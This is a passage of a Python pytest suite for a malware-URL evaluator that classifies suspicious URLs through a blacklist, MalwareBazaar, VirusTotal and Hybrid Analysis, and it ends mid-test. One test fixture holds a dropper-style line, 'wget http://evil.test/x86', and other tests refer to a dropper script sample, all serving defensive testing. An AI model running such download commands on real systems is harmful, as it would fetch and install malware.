import hashlib
import json
import logging
import re
import signal
import time
from datetime import datetime, timedelta, timezone

import pytest
import requests
import responses
from freezegun import freeze_time

from bin.evaluator import NO_CONTENT, Content
from common import file_classifier, hybrid_analysis
from tests.api_mocks import (VT_API, load_bytes, load_json, mock_blacklist, mock_external_apis, mock_ha_overview,
                             mock_mb, mock_vt)
from tests.factories import insert_content, insert_discovered, insert_download, insert_sandbox_submission, insert_url

URL = "http://evil.test/a.sh"
SCRIPT = load_bytes("samples", "dropper.sh")


def serve(http_mock, url=URL, body=SCRIPT, content_type="application/x-sh", **kwargs):
    """The suspicious URL itself returns `body` (unit tests mock it with responses)."""
    return http_mock.get(url, body=body, content_type=content_type, **kwargs)


@pytest.mark.parametrize("stats, expected", [
    ({"malicious": 3, "harmless": 7}, "malicious"),      # 30 % > 20 %
    ({"malicious": 1, "harmless": 9}, "harmless"),       # 90 % > 80 %
    ({"malicious": 1, "harmless": 4, "undetected": 5}, "unclassified"),
    ({}, "unclassified"),
])
def test_vt_stats_analysis(evaluator_mod, stats, expected):
    assert evaluator_mod.vt_stats_analysis(stats) == expected


def test_invalid_url(evaluator_mod, http_mock):
    result = evaluator_mod.evaluate_url("evil.test/no-scheme")
    assert result["classification"] == "invalid" and result["classification_reason"] == "Invalid format"
    assert len(http_mock.calls) == 0


def test_process_url_stores_result_and_history(evaluator_mod, db):
    url = insert_url(db, "not a url")

    assert evaluator_mod.process_url(url)["classification"] == "invalid"

    row = db.execute("SELECT classification, classification_reason, evaluated FROM urls WHERE url = ?", (url,)).fetchone()
    assert row == ("invalid", "Invalid format", "yes")
    history = db.execute("SELECT classification, actor FROM classification_history WHERE url = ?", (url,)).fetchall()
    assert history == [("invalid", "evaluator")]


def test_blacklisted_url_is_malicious_and_content_is_stored(evaluator_mod, http_mock, config, db):
    insert_url(db, URL)
    serve(http_mock)
    mock_external_apis(http_mock, config, blacklist=[URL])

    result = evaluator_mod.evaluate_url(URL)

    assert (result["classification"], result["classification_reason"]) == ("malicious", "Blacklist check")
    # content is downloaded and stored even when the blacklist decides
    sha256 = hashlib.sha256(SCRIPT).hexdigest()
    assert db.execute("SELECT sha256, file_category FROM content").fetchone() == (sha256, "script")
    assert db.execute("SELECT source_ip, status_code, change_type FROM download_observations").fetchone() == (
        "192.0.2.1", 200, "initial")


def test_known_hash_on_malwarebazaar(evaluator_mod, http_mock, config, db):
    insert_url(db, URL)
    serve(http_mock)
    apis = mock_external_apis(http_mock, config, mb_known=True)

    result = evaluator_mod.evaluate_url(URL)

    assert (result["classification"], result["classification_reason"]) == ("malicious", "MB file check")
    assert apis["vt_url"].call_count == 0  # MalwareBazaar answered first


def test_malicious_on_virustotal_url_check(evaluator_mod, http_mock, config, db):
    insert_url(db, URL)
    serve(http_mock)
    mock_external_apis(http_mock, config, vt_url="url_malicious.json")

    result = evaluator_mod.evaluate_url(URL)

    assert (result["classification"], result["classification_reason"]) == ("malicious", "VT URL check")
    assert result["threat_label"] == "trojan.mirai/gafgyt"
    assert '"malicious": 12' in result["vt_stats"]


def test_harmless_on_virustotal_file_check(evaluator_mod, http_mock, config, db):
    insert_url(db, URL)
    serve(http_mock)
    mock_external_apis(http_mock, config, vt_file="file_harmless.json")

    result = evaluator_mod.evaluate_url(URL)

    assert (result["classification"], result["classification_reason"]) == ("harmless", "VT file check")
    assert result["hash"] == hashlib.sha1(SCRIPT).hexdigest()
    assert result["file_mime_type"] == "application/x-sh"


def test_unknown_everywhere(evaluator_mod, http_mock, config, db):
    insert_url(db, URL)
    serve(http_mock)
    apis = mock_external_apis(http_mock, config)

    result = evaluator_mod.evaluate_url(URL)

    assert (result["classification"], result["classification_reason"]) == ("unclassified", "No entry")
    assert result["evaluated"] == "yes"
    assert apis["mb"].call_count == apis["vt_url"].call_count == apis["vt_file"].call_count == 1


def test_vt_daily_quota_postpones_evaluation(evaluator_mod, http_mock, config, db):
    insert_url(db, URL)
    serve(http_mock)
    apis = mock_external_apis(http_mock, config, vt_url="quota_exceeded.json")

    result = evaluator_mod.evaluate_url(URL)

    assert (result["evaluated"], result["eval_later"]) == ("no", "yes")
    assert evaluator_mod.vt_daily_quota_exceeded is True
    assert apis["vt_file"].call_count == 0


def test_vt_minute_quota_waits(evaluator_mod, http_mock, no_sleep):
    mock_vt(http_mock, "urls")
    evaluator_mod.vt_minute_quota_cnt = evaluator_mod.vt_minute_quota
    evaluator_mod.vt_minute_quota_timestamp = datetime.now(timezone.utc)

    evaluator_mod.vt_request("URL", "id")

    assert len(no_sleep) == 1 and 55 < no_sleep[0] <= 60
    assert evaluator_mod.vt_minute_quota_cnt == 1


def test_unreachable_url(evaluator_mod, http_mock, config, db):
    insert_url(db, URL)
    # URL itself is not registered -> responses raises ConnectionError
    mock_external_apis(http_mock, config)

    result = evaluator_mod.evaluate_url(URL)

    assert (result["classification"], result["classification_reason"]) == ("unreachable", "Connection error")


def test_nested_urls_from_shell_script_are_added(evaluator_mod, http_mock, config, db):
    insert_url(db, URL)
    serve(http_mock)
    mock_external_apis(http_mock, config)

    evaluator_mod.evaluate_url(URL)

    assert db.execute("SELECT url, src_url FROM discovered_urls").fetchall() == [("http://evil.test/bins/x86", URL)]
    assert db.execute("SELECT source FROM url_source WHERE url = 'http://evil.test/bins/x86'").fetchone() == ("URL content",)


def test_too_large_content(evaluator_mod, http_mock, config, db):
    insert_url(db, URL)
    serve(http_mock, headers={"Content-Length": str(2 * 1024 * 1024)})  # max_file_size is 1 MB in tests
    mock_external_apis(http_mock, config)

    result = evaluator_mod.evaluate_url(URL)

    assert result["classification_reason"] == "File too large"


# --- Hybrid Analysis submission of still unclassified executables / scripts ---

def test_unclassified_script_is_submitted_to_hybrid_analysis(evaluator_mod, http_mock, config, db):
    insert_url(db, URL)
    serve(http_mock)
    apis = mock_external_apis(http_mock, config)

    with freeze_time("2026-01-01 12:00:00"):
        result = evaluator_mod.evaluate_url(URL)

    assert result["classification"] == "unclassified"
    assert apis["ha_submit"].call_count == 1
    # the report is fetched 10, 20 and 30 min after the submission
    assert db.execute("SELECT submitted_by, status, next_fetch_at FROM sandbox_submissions").fetchone() == (
        "evaluator", "pending", "2026-01-01T12:10:00+00:00")


@pytest.mark.parametrize("body, content_type", [
    (b"<html><body>It works!</body></html>", "text/html"),
    (b'{"status": "ok"}', "application/json"),
])
def test_unclassified_other_content_is_not_submitted(evaluator_mod, http_mock, config, db, body, content_type):
    insert_url(db, URL)
    serve(http_mock, body=body, content_type=content_type)
    apis = mock_external_apis(http_mock, config)

    assert evaluator_mod.evaluate_url(URL)["classification"] == "unclassified"
    assert apis["ha_submit"].call_count == 0
    assert db.execute("SELECT COUNT(*) FROM sandbox_submissions").fetchone()[0] == 0


@pytest.mark.parametrize("vt_url", ["url_malicious.json", "quota_exceeded.json"])
def test_classified_or_postponed_url_is_not_submitted(evaluator_mod, http_mock, config, db, vt_url):
    insert_url(db, URL)
    serve(http_mock)
    apis = mock_external_apis(http_mock, config, vt_url=vt_url)

    evaluator_mod.evaluate_url(URL)

    assert apis["ha_submit"].call_count == 0


def test_unclassified_script_already_analysed_is_classified_by_its_report(evaluator_mod, http_mock, config, db):
    insert_url(db, URL)
    serve(http_mock)
    apis = mock_external_apis(http_mock, config, ha_status=200)

    result = evaluator_mod.evaluate_url(URL)

    assert (result["classification"], result["classification_reason"], result["threat_label"]) == (
        "malicious", "Hybrid Analysis check", "Linux.Mirai")
    assert apis["ha_submit"].call_count == 0


def test_scheduled_fetch_of_evaluator_submission_classifies_url(evaluator_mod, http_mock, config, db):
    src_url = insert_url(db, "http://evil.test/", evaluated="yes")
    insert_url(db, URL, evaluated="yes")
    insert_discovered(db, URL, src_url)
    content_id = insert_content(db, SCRIPT)
    insert_download(db, URL, content_id)
    insert_sandbox_submission(db, content_id, hashlib.sha256(SCRIPT).hexdigest(), submitted_by="evaluator",
                              next_fetch_at="2026-01-01T12:10:00+00:00")
    mock_ha_overview(http_mock, config, status=200)

    with freeze_time("2026-01-01 12:10:05"):
        evaluator_mod.fetch_job.run()

    assert db.execute("SELECT classification, classification_reason, threat_label FROM urls WHERE url = ?",
                      (URL,)).fetchone() == ("malicious", "Hybrid Analysis check", "Linux.Mirai")
    assert db.execute("SELECT classification FROM urls WHERE url = ?", (src_url,)).fetchone() == ("malicious",)
    assert db.execute("SELECT url, actor FROM classification_history ORDER BY id").fetchall() == [
        (URL, "hybrid-analysis"), (src_url, "hybrid-analysis-backprop")]
    assert db.execute("SELECT status, verdict FROM sandbox_submissions").fetchone() == ("done", "malicious")


# --- Content download: failures, storage, file type ---

def test_content_without_content_type_is_sniffed_and_searched_for_urls(evaluator_mod, http_mock, config, db):
    insert_url(db, URL)
    serve(http_mock, content_type=None)
    mock_external_apis(http_mock, config)

    result = evaluator_mod.evaluate_url(URL)

    assert result["file_mime_type"] == "text/x-shellscript"
    assert db.execute("SELECT url FROM discovered_urls").fetchall() == [("http://evil.test/bins/x86",)]


def test_non_utf8_text_content_is_stored_without_url_search(evaluator_mod, http_mock, config, db):
    insert_url(db, URL)
    serve(http_mock, body=b"\xff\xfe wget http://evil.test/x86", content_type="text/plain")
    mock_external_apis(http_mock, config)

    assert evaluator_mod.evaluate_url(URL)["classification"] == "unclassified"
    assert db.execute("SELECT COUNT(*) FROM discovered_urls").fetchone()[0] == 0
    assert db.execute("SELECT COUNT(*) FROM content").fetchone()[0] == 1


def test_empty_body_is_recorded_without_content(evaluator_mod, http_mock, config, db):
    insert_url(db, URL)
    serve(http_mock, body=b"")
    apis = mock_external_apis(http_mock, config)

    result = evaluator_mod.evaluate_url(URL)

    assert (result["classification_reason"], "hash" in result) == ("No content", False)
    assert apis["mb"].call_count == apis["vt_file"].call_count == 0  # no lookups of the empty file's hash
    assert db.execute("SELECT status_code, content_id, fetch_error FROM download_observations").fetchone() == (
        200, None, "empty_body")


def test_storage_failure_does_not_break_classification(init_bin, make_config, http_mock, db, tmp_path):
    not_a_dir = tmp_path / "file"
    not_a_dir.write_text("x")
    ev = init_bin("evaluator", make_config(content_dir=str(not_a_dir)))
    insert_url(db, URL)
    serve(http_mock)
    mock_external_apis(http_mock, ev.config, mb_known=True)

    result = ev.evaluate_url(URL)

    assert (result["classification"], result["classification_reason"]) == ("malicious", "MB file check")
    assert db.execute("SELECT content_id, fetch_error FROM download_observations").fetchone() == (None, "storage_failed")
    assert db.execute("SELECT COUNT(*) FROM content").fetchone()[0] == 0


def test_reevaluation_reuses_stored_content(evaluator_mod, http_mock, config, db):
    insert_url(db, URL)
    serve(http_mock)
    mock_external_apis(http_mock, config)

    evaluator_mod.evaluate_url(URL)
    evaluator_mod.evaluate_url(URL)

    assert db.execute("SELECT COUNT(*) FROM content").fetchone()[0] == 1
    assert [r[0] for r in db.execute("SELECT change_type FROM download_observations ORDER BY id")] == [
        "initial", "confirmed"]


def test_unreachable_url_is_still_classified_by_blacklist(evaluator_mod, http_mock, config, db):
    insert_url(db, URL)
    mock_external_apis(http_mock, config, blacklist=[URL])  # URL itself not registered -> ConnectionError

    result = evaluator_mod.evaluate_url(URL)

    assert (result["classification"], result["classification_reason"]) == ("malicious", "Blacklist check")
    assert db.execute("SELECT content_id, fetch_error FROM download_observations").fetchone() == (
        None, "connection_error")


@pytest.mark.parametrize("error, fetch_error", [
    (requests.exceptions.ConnectTimeout(), "timeout"),
    (requests.exceptions.ReadTimeout(), "timeout"),
    (requests.exceptions.TooManyRedirects(), "too_many_redirects"),
    (requests.exceptions.ConnectionError(), "connection_error"),
    (requests.exceptions.InvalidURL(), "request_error"),
])
def test_download_errors_are_unreachable(evaluator_mod, http_mock, config, db, error, fetch_error):
    insert_url(db, URL)
    mock_external_apis(http_mock, config)
    http_mock.get(URL, body=error)

    result = evaluator_mod.evaluate_url(URL)

    assert (result["classification"], result["classification_reason"]) == ("unreachable", "Connection error")
    # the cause is shown on the Content tab
    assert db.execute("SELECT fetch_error FROM download_observations").fetchone() == (fetch_error,)


@pytest.mark.parametrize("content, expected", [
    (NO_CONTENT, {"classification": "unclassified", "classification_reason": "No content"}),
    (Content(None, None, "2097152", None),
     {"classification": "unclassified", "classification_reason": "File too large", "content_size": "2097152"}),
])
def test_analyze_content_without_usable_body(evaluator_mod, http_mock, content, expected):
    assert evaluator_mod.analyze_content(content) == expected
    assert len(http_mock.calls) == 0  # no VirusTotal lookup


def test_malwarebazaar_error_falls_back_to_virustotal(evaluator_mod, http_mock, config, db, monkeypatch):
    monkeypatch.setattr(evaluator_mod, "MB_RETRY_DELAY", 0)
    insert_url(db, URL)
    serve(http_mock)
    apis = mock_external_apis(http_mock, config, vt_file="file_harmless.json")
    mb = http_mock.replace(responses.POST, config.mb_url, body="<html>502 Bad Gateway</html>", status=502)

    result = evaluator_mod.evaluate_url(URL)

    assert mb.call_count == evaluator_mod.MB_ATTEMPTS
    assert result["classification_reason"] == "VT file check"
    assert apis["vt_file"].call_count == 1


def test_malwarebazaar_temporary_error_is_retried(evaluator_mod, http_mock, config, db, monkeypatch):
    monkeypatch.setattr(evaluator_mod, "MB_RETRY_DELAY", 0)
    insert_url(db, URL)
    serve(http_mock)
    apis = mock_external_apis(http_mock, config)
    http_mock.remove(responses.POST, config.mb_url)
    http_mock.post(config.mb_url, body="<html>502 Bad Gateway</html>", status=502)
    mock_mb(http_mock, config, known=True)

    result = evaluator_mod.evaluate_url(URL)

    assert result["classification_reason"] == "MB file check"
    assert apis["vt_url"].call_count == 0


# --- URLhaus blacklist cache ---

def test_blacklist_is_cached_for_bl_update_time(evaluator_mod, http_mock, config):
    call = mock_blacklist(http_mock, config, [URL])

    with freeze_time("2026-01-01 12:00:00") as clock:
        assert evaluator_mod.is_blacklisted(URL) is True
        clock.tick(timedelta(minutes=14))  # bl_update_time = 15
        assert evaluator_mod.is_blacklisted("http://other.test/") is False
        assert call.call_count == 1
        clock.tick(timedelta(minutes=2))
        evaluator_mod.is_blacklisted(URL)

    assert call.call_count == 2


def test_blacklist_download_error_is_not_cached(evaluator_mod, http_mock, config):
    http_mock.get(config.urlhaus_blacklist_url, body=requests.exceptions.ConnectionError())

    assert evaluator_mod.is_blacklisted(URL) is False
    assert evaluator_mod.blacklist == [] and evaluator_mod.bl_last_updated is None


# --- VirusTotal ---

def test_vt_daily_quota_is_reset_the_next_day(evaluator_mod, http_mock):
    call = mock_vt(http_mock, "urls", "url_malicious.json")

    with freeze_time("2026-01-01 23:00:00") as clock:
        evaluator_mod.vt_daily_quota_exceeded = True
        evaluator_mod.vt_daily_quota_timestamp = datetime.now(timezone.utc)
        assert evaluator_mod.vt_request("URL", "id")["classification_reason"] == "VT limit exceeded"
        assert call.call_count == 0
        clock.tick(timedelta(hours=2))
        assert evaluator_mod.vt_request("URL", "id")["classification"] == "malicious"

    assert evaluator_mod.vt_daily_quota_exceeded is False


def test_vt_inconclusive_stats(evaluator_mod, http_mock):
    http_mock.get(re.compile(re.escape(VT_API) + "files/.+"), json={"data": {"attributes": {
        "last_analysis_stats": {"malicious": 1, "harmless": 1, "undetected": 8}}}})

    result = evaluator_mod.vt_request("file", "sha1")

    assert (result["classification"], result["classification_reason"]) == ("unclassified", "VT file check inconclusive")
    assert "threat_label" not in result


def test_vt_unexpected_status_is_no_entry(evaluator_mod, http_mock):
    mock_vt(http_mock, "urls", "not_found.json", status=500)

    result = evaluator_mod.vt_request("URL", "id")

    assert (result["classification"], result["classification_reason"]) == ("unclassified", "No entry")
    assert evaluator_mod.vt_daily_quota_exceeded is False


def test_next_url_skips_postponed_urls_while_vt_quota_is_exceeded(evaluator_mod, db):
    insert_url(db, "http://postponed.test/", eval_later="yes")

    assert evaluator_mod.next_url() == "http://postponed.test/"
    evaluator_mod.vt_daily_quota_exceeded = True
    assert evaluator_mod.next_url() is None
    insert_url(db, "http://new.test/")
    assert evaluator_mod.next_url() == "http://new.test/"


# --- Back-propagation ---

def test_back_propagation_records_each_source_url(evaluator_mod, db, monkeypatch):
    url = insert_url(db, URL)
    sources = [insert_url(db, f"http://loader.test/{i}.sh") for i in range(2)]
    known_bad = insert_url(db, "http://loader.test/bad.sh", classification="malicious")
    for src in sources + [known_bad]:
        insert_discovered(db, url, src)
    monkeypatch.setattr(evaluator_mod, "evaluate_url", lambda u: dict(
        evaluated="yes", eval_later="no", classification="malicious", classification_reason="Blacklist check"))

    evaluator_mod.process_url(url)

    for src in sources:
        assert db.execute("SELECT classification, classification_reason FROM urls WHERE url = ?",
                          (src,)).fetchone() == ("malicious", "Downloading from malicious URL")
    assert db.execute("SELECT url, actor FROM classification_history WHERE actor = 'evaluator-backprop' "
                      "ORDER BY url").fetchall() == [(src, "evaluator-backprop") for src in sources]


def test_back_propagation_handles_quote_in_source_url(evaluator_mod, db, monkeypatch):
    url = insert_url(db, URL)
    src = insert_url(db, "http://loader.test/it's.sh")
    insert_discovered(db, url, src)
    monkeypatch.setattr(evaluator_mod, "evaluate_url", lambda u: dict(
        evaluated="yes", eval_later="no", classification="malicious", classification_reason="Blacklist check"))

    evaluator_mod.process_url(url)

    assert db.execute("SELECT classification FROM urls WHERE url = ?", (src,)).fetchone() == ("malicious",)


# --- Hybrid Analysis: lookup of stored content, submissions, usage stats ---

def test_stored_content_lookup_is_saved(evaluator_mod, http_mock, config, db):
    insert_url(db, URL)
    serve(http_mock, body=b"<html>It works</html>", content_type="text/html")
    mock_external_apis(http_mock, config)

    evaluator_mod.evaluate_url(URL)

    info = json.loads(db.execute("SELECT sandbox_info FROM content").fetchone()[0])
    assert info["hybrid_analysis"]["http_status"] == 404 and info["hybrid_analysis"]["tested"] is False
    assert evaluator_mod.ha_url_stats["checked"] == 1


def test_rate_limited_lookup_pauses_submission(evaluator_mod, http_mock, config, db):
    insert_url(db, URL)
    serve(http_mock)
    apis = mock_external_apis(http_mock, config)
    http_mock.replace(responses.GET, re.compile(f"{config.ha_url}/overview/.+"), json={"message": "limit"},
                      status=429, headers={"Retry-After": "600"})

    result = evaluator_mod.evaluate_url(URL)

    assert result["classification"] == "unclassified"
    assert evaluator_mod.ha_url_stats["rate_limited"] == 1
    assert apis["ha_submit"].call_count == 0
    assert db.execute("SELECT COUNT(*) FROM sandbox_submissions").fetchone()[0] == 0


def test_content_with_active_submission_is_not_submitted_again(evaluator_mod, http_mock, config, db, content_dir):
    insert_url(db, URL)
    content_id = insert_content(db, SCRIPT, content_dir=content_dir, file_category="script")
    insert_sandbox_submission(db, content_id, hashlib.sha256(SCRIPT).hexdigest(), status="pending")
    serve(http_mock)
    apis = mock_external_apis(http_mock, config)

    assert evaluator_mod.evaluate_url(URL)["classification"] == "unclassified"
    assert apis["ha_submit"].call_count == 0
    assert db.execute("SELECT COUNT(*) FROM sandbox_submissions").fetchone()[0] == 1


def test_rejected_submission_is_logged_as_error(evaluator_mod, http_mock, config, db):
    insert_url(db, URL)
    serve(http_mock)
    mock_external_apis(http_mock, config)
    http_mock.replace(responses.POST, f"{config.ha_url}/submit/file", json={"message": "quota"}, status=403)

    assert evaluator_mod.evaluate_url(URL)["classification"] == "unclassified"
    assert db.execute("SELECT submitted_by, status, next_fetch_at FROM sandbox_submissions").fetchone() == (
        "evaluator", "error", None)
    assert evaluator_mod.ha_url_stats["submit_submit_failed"] == 1


def test_suspicious_report_neither_classifies_nor_submits(evaluator_mod, http_mock, config, db):
    insert_url(db, URL)
    serve(http_mock)
    apis = mock_external_apis(http_mock, config)
    body = load_json("ha", "overview_200.json")
    body["verdict"] = "suspicious"
    http_mock.replace(responses.GET, re.compile(f"{config.ha_url}/overview/.+"), json=body)

    result = evaluator_mod.evaluate_url(URL)

    assert (result["classification"], result["classification_reason"]) == ("unclassified", "No entry")
    assert apis["ha_submit"].call_count == 0


def test_hybrid_analysis_disabled_without_api_key(init_bin, make_config, http_mock, db):
    ev = init_bin("evaluator", make_config(ha_key="!!! CHANGE THIS !!!"))
    insert_url(db, URL)
    serve(http_mock)
    apis = mock_external_apis(http_mock, ev.config)

    assert ev.evaluate_url(URL)["classification"] == "unclassified"
    assert apis["ha"].call_count == 0 and apis["ha_submit"].call_count == 0


def test_ha_usage_is_logged_once_per_interval(evaluator_mod, caplog):
    caplog.set_level(logging.INFO, logger="evaluator.py")
    evaluator_mod.ha_url_stats["checked"] = 3
    evaluator_mod.ha_stats_started = time.monotonic()

    evaluator_mod._log_ha_usage_if_ha_stats_interval_minutes_reached()
    assert "Hybrid Analysis (last" not in caplog.text and evaluator_mod.ha_url_stats["checked"] == 3

    evaluator_mod.ha_stats_started -= 10 * 60  # ha_stats_interval_minutes = 10
    evaluator_mod._log_ha_usage_if_ha_stats_interval_minutes_reached()
    assert "3 URLs with hash successfully checked" in caplog.text
    assert not any(evaluator_mod.ha_url_stats.values())  # a new window starts


def test_ha_usage_is_logged_on_shutdown(evaluator_mod, caplog):
    caplog.set_level(logging.INFO, logger="evaluator.py")
    evaluator_mod.ha_url_stats["failed"] = 1

    evaluator_mod._log_ha_usage_if_ha_stats_interval_minutes_reached(force=True)

    assert "1 failed" in caplog.text


# --- Pipeline order (bin/README.md steps 2-8) ---

def _service(call, config):
    """Which step of the pipeline sent the request."""
    url = call.request.url
    for name, prefix in [("download", URL), ("blacklist", config.urlhaus_blacklist_url), ("mb", config.mb_url),
                         ("vt_url", VT_API + "urls/"), ("vt_file", VT_API + "files/"),
                         ("ha", f"{config.ha_url}/overview/"), ("ha_submit", f"{config.ha_url}/submit/")]:
        if url.startswith(prefix):
            return name
    return url


def test_pipeline_follows_readme_order(evaluator_mod, http_mock, config, db):
    insert_url(db, URL)
    serve(http_mock)
    mock_external_apis(http_mock, config)

    evaluator_mod.evaluate_url(URL)

    order = list(dict.fromkeys(_service(call, config) for call in http_mock.calls))
    assert order == ["download", "ha", "blacklist", "mb", "vt_url", "vt_file", "ha_submit"]


def test_malwarebazaar_is_queried_once(evaluator_mod, http_mock, config, db):
    insert_url(db, URL)
    serve(http_mock)
    apis = mock_external_apis(http_mock, config)

    evaluator_mod.evaluate_url(URL)

    assert apis["mb"].call_count == 1


# --- Domain flood (step 3) ---

def _flood(make_config, init_bin, db, limit=2):
    """evaluator with same_domain_all_sessions = `limit` and two other URLs of URL's domain."""
    ev = init_bin("evaluator", make_config(ddos_threshold={
        "same_url_single_session": 10, "same_domain_single_session": 100, "same_domain_all_sessions": limit}))
    for i in range(2):
        insert_url(db, f"http://evil.test/{i}")
    return ev


def test_domain_flood_deletes_url_and_stops_pipeline(make_config, init_bin, http_mock, db):
    ev = _flood(make_config, init_bin, db)
    insert_url(db, URL)
    serve(http_mock)
    apis = mock_external_apis(http_mock, ev.config)

    assert ev.process_url(URL) is None

    assert db.execute("SELECT COUNT(*) FROM urls").fetchone()[0] == 0
    assert db.execute("SELECT COUNT(*) FROM content").fetchone()[0] == 0  # its payload is purged too
    assert apis["blacklist"].call_count == apis["mb"].call_count == apis["vt_url"].call_count == 0


def test_domain_at_threshold_is_not_a_flood(make_config, init_bin, http_mock, db):
    ev = _flood(make_config, init_bin, db, limit=3)
    insert_url(db, URL)
    serve(http_mock, body=b"#!/bin/sh\necho hi\n")  # dropper.sh would add a nested URL of the same domain
    mock_external_apis(http_mock, ev.config, blacklist=[URL])

    assert ev.evaluate_url(URL)["classification_reason"] == "Blacklist check"
    assert db.execute("SELECT COUNT(*) FROM urls").fetchone()[0] == 3


def test_malicious_url_of_flooded_domain_is_evaluated(make_config, init_bin, http_mock, db):
    # re-queued from the web UI: classification kept, evaluated='no'
    ev = _flood(make_config, init_bin, db)
    insert_url(db, URL, classification="malicious")
    serve(http_mock)
    mock_external_apis(http_mock, ev.config, blacklist=[URL])

    assert ev.process_url(URL)["classification"] == "malicious"

    assert db.execute("SELECT url, evaluated FROM urls").fetchall() == [(URL, "yes")]  # the others were deleted
    assert ev.next_url() is None  # not picked again forever


# --- VirusTotal ---

def test_vt_quota_postpones_unreachable_url(evaluator_mod, http_mock, config, db):
    insert_url(db, URL)
    mock_external_apis(http_mock, config, vt_url="quota_exceeded.json")  # URL not served -> ConnectionError

    result = evaluator_mod.evaluate_url(URL)

    assert (result["evaluated"], result["eval_later"]) == ("no", "yes")


def test_inconclusive_vt_url_check_is_kept_when_file_is_unknown(evaluator_mod, http_mock, config, db):
    insert_url(db, URL)
    serve(http_mock)
    mock_external_apis(http_mock, config)
    http_mock.replace(responses.GET, re.compile(re.escape(VT_API + "urls/") + ".+"), json={"data": {"attributes": {
        "last_analysis_stats": {"malicious": 1, "harmless": 1, "undetected": 8}}}})

    result = evaluator_mod.evaluate_url(URL)

    assert (result["classification"], result["classification_reason"]) == ("unclassified", "VT URL check inconclusive")
    assert '"undetected": 8' in result["vt_stats"]
    assert result["hash"] == hashlib.sha1(SCRIPT).hexdigest()


def test_inconclusive_vt_url_check_is_kept_without_content(evaluator_mod, http_mock, config, db):
    insert_url(db, URL)
    serve(http_mock, status=404)
    mock_external_apis(http_mock, config)
    http_mock.replace(responses.GET, re.compile(re.escape(VT_API + "urls/") + ".+"), json={"data": {"attributes": {
        "last_analysis_stats": {"malicious": 1, "harmless": 1, "undetected": 8}}}})

    assert evaluator_mod.evaluate_url(URL)["classification_reason"] == "VT URL check inconclusive"


def test_http_error_without_content_is_no_content(evaluator_mod, http_mock, config, db):
    insert_url(db, URL)
    serve(http_mock, status=404)
    apis = mock_external_apis(http_mock, config)

    result = evaluator_mod.evaluate_url(URL)

    assert (result["classification"], result["classification_reason"]) == ("unclassified", "No content")
    assert apis["mb"].call_count == apis["vt_file"].call_count == 0


def test_vt_answer_without_stats_is_no_entry(evaluator_mod, http_mock):
    http_mock.get(re.compile(re.escape(VT_API) + "urls/.+"), json={"data": {"attributes": {}}})

    assert evaluator_mod.vt_request("URL", "id") == {"classification": "unclassified", "classification_reason": "No entry"}


def test_vt_minute_quota_does_not_wait_after_60_s(evaluator_mod, http_mock, no_sleep):
    mock_vt(http_mock, "urls")
    evaluator_mod.vt_minute_quota_cnt = evaluator_mod.vt_minute_quota
    evaluator_mod.vt_minute_quota_timestamp = datetime.now(timezone.utc) - timedelta(seconds=61)

    evaluator_mod.vt_request("URL", "id")

    assert no_sleep == [] and evaluator_mod.vt_minute_quota_cnt == 1


def test_postponed_url_is_stored_without_history(evaluator_mod, http_mock, config, db):
    insert_url(db, URL)
    serve(http_mock)
    mock_external_apis(http_mock, config, vt_url="quota_exceeded.json")

    evaluator_mod.process_url(URL)

    assert db.execute("SELECT evaluated, eval_later, classification_reason FROM urls").fetchone() == (
        "no", "yes", "VT limit exceeded")
    assert db.execute("SELECT COUNT(*) FROM classification_history").fetchone()[0] == 0


# --- Download errors ---

def test_invalid_content_length_is_not_unreachable(evaluator_mod, http_mock, config, db):
    insert_url(db, URL)
    serve(http_mock, headers={"Content-Length": "abc"})
    mock_external_apis(http_mock, config)

    result = evaluator_mod.evaluate_url(URL)

    assert result["classification"] == "unclassified" and result["hash"] == hashlib.sha1(SCRIPT).hexdigest()
    assert db.execute("SELECT status_code, change_type FROM download_observations").fetchone() == (200, "initial")


def test_unexpected_download_error_is_not_unreachable(evaluator_mod, http_mock, config, db, monkeypatch):
    insert_url(db, URL)
    mock_external_apis(http_mock, config)
    monkeypatch.setattr(evaluator_mod, "_fetch_and_store_content", lambda url: 1 / 0)

    result = evaluator_mod.evaluate_url(URL)

    assert (result["classification"], result["classification_reason"]) == ("unclassified", "No content")


def test_unsupported_scheme_is_unreachable(evaluator_mod, http_mock, config, db):
    url = insert_url(db, "ftp://evil.test/a.sh")
    mock_external_apis(http_mock, config)

    result = evaluator_mod.evaluate_url(url)

    assert (result["classification"], result["classification_reason"]) == ("unreachable", "Connection error")
    assert db.execute("SELECT fetch_error FROM download_observations").fetchone() == ("request_error",)


# --- Hybrid Analysis (step 8) ---

def test_unclassified_script_whitelisted_by_its_report_stays_unclassified(evaluator_mod, http_mock, config, db):
    # Hybrid Analysis never classifies a URL harmless
    insert_url(db, URL)
    serve(http_mock)
    apis = mock_external_apis(http_mock, config)
    body = load_json("ha", "overview_200.json")
    body["verdict"] = "whitelisted"
    http_mock.replace(responses.GET, re.compile(f"{config.ha_url}/overview/.+"), json=body)

    result = evaluator_mod.evaluate_url(URL)

    assert (result["classification"], result["classification_reason"]) == ("unclassified", "No entry")
    assert apis["ha_submit"].call_count == 0  # the sample has a report, nothing to submit


def test_report_found_by_fresh_lookup_before_submission_classifies_url(evaluator_mod, http_mock, config, db):
    insert_url(db, URL)
    serve(http_mock)
    apis = mock_external_apis(http_mock, config)  # lookup when the content is stored: 404
    mock_ha_overview(http_mock, config, status=200)  # forced lookup before the submission: the report exists

    result = evaluator_mod.evaluate_url(URL)

    assert (result["classification"], result["classification_reason"], result["threat_label"]) == (
        "malicious", "Hybrid Analysis check", "Linux.Mirai")
    assert apis["ha_submit"].call_count == 0


def test_unclassified_script_that_could_not_be_stored_is_not_submitted(init_bin, make_config, http_mock, db, tmp_path):
    not_a_dir = tmp_path / "file"
    not_a_dir.write_text("x")
    ev = init_bin("evaluator", make_config(content_dir=str(not_a_dir)))
    insert_url(db, URL)
    serve(http_mock)
    apis = mock_external_apis(http_mock, ev.config)

    assert ev.evaluate_url(URL)["classification"] == "unclassified"
    assert apis["ha"].call_count == 0 and apis["ha_submit"].call_count == 0


def test_content_not_classified_by_magika_is_not_submitted(evaluator_mod, http_mock, config, db, monkeypatch):
    monkeypatch.setattr(file_classifier, "_magika", None)
    monkeypatch.setattr(file_classifier, "_magika_failed", True)
    insert_url(db, URL)
    serve(http_mock)
    apis = mock_external_apis(http_mock, config)

    assert evaluator_mod.evaluate_url(URL)["classification"] == "unclassified"
    assert db.execute("SELECT file_category FROM content").fetchone() == (None,)
    assert apis["ha_submit"].call_count == 0


def test_suspicious_report_is_not_looked_up_again(evaluator_mod, http_mock, config, db):
    insert_url(db, URL)
    serve(http_mock)
